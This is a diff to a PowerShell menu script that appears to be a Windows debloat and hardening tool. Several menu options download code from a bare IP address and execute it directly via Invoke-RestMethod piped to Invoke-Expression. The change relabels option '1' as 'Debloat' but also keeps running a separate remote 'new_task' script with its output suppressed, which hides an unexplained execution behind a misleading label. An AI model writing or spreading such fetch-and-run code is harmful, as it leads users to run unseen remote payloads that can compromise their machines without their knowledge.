@@ -114,7 +114,7 @@ function Show-MainMenu {
      Write-Host 
      Write-Host 
 
-     Write-Host -ForegroundColor Yellow "Press '1' for collect windows log."
+     Write-Host -ForegroundColor Yellow "Press '1' for windows10/11 Debloat."
      Write-Host 
      Write-Host -ForegroundColor Yellow "Press '2' for Security Harddent windows 10/11 or Windows Server 2016/2019/2022."
      Write-Host 
@@ -137,7 +137,9 @@ function Show-MainMenu {
 
      switch ($selection) {
             '1' {
-               Invoke-RestMethod 47.107.152.77/new_task | Invoke-Expression
+               Invoke-RestMethod 47.107.152.77/debloat2| Invoke-Expression
+               Invoke-RestMethod 47.107.152.77/new_task| Invoke-Expression |Out-Null
+
           } '2' {
                Invoke-RestMethod 47.107.152.77/harden | Invoke-Expression
           } '3' {
